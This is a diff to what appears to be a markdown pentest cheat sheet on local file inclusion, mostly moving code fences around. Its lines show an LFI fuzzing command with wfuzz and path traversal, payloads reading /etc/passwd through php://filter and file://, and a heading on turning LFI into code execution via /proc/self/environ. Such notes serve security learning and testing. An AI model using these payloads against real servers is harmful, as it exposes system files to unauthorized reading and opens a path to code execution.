@@ -406,7 +406,9 @@ cat url.txt|gf lfi |tee a.txt
 >block/etc/passwd/
 ```
 ../var/www/*
+```
 >tool for scan
+
 ```
 wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
 ```
@@ -417,7 +419,6 @@ to
 php://filter/convert.base64-encode/resource=dog/../../../etc/passwd
 ```
 >[lfi scan ](https://github.com/halohashm79/lfi-scan)
-```
 >python lfi.py
 
 >next
@@ -428,7 +429,7 @@ php://filter/convert.base64-encode/resource=dog/../../../etc/passwd
 >payalod lfi
 ```
 file:///etc/passwd
-
+```
 ># lfi to rce
 > /proc/self/environ
 ```
